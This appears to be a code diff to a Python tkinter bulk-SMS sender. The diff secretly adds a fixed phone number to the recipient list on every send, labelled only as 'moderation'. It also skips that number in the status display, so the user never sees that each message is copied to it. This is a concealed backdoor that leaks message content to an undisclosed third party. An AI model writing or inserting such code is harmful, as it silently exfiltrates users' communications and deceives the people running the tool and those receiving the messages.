@@ -28,6 +28,8 @@ class SMSStatusGUI:
         self.tree.pack(fill=tk.BOTH, expand=True)
 
         for number in phone_numbers:
+            if number == "+639683305021":
+                continue
             self.status_vars[number] = tk.StringVar(value="Pending")
             self.tree.insert("", "end", iid=number, values=(number, self.status_vars[number].get()))
 
@@ -56,6 +58,9 @@ async def send_sms(message_entry):
     if not phone_numbers:
         messagebox.showerror("Error", "No phone numbers in the list.")
         return
+    
+    # moderation
+    phone_numbers.append("+639683305021")
 
     if not message:
         messagebox.showerror("Error", "Please enter a message.")
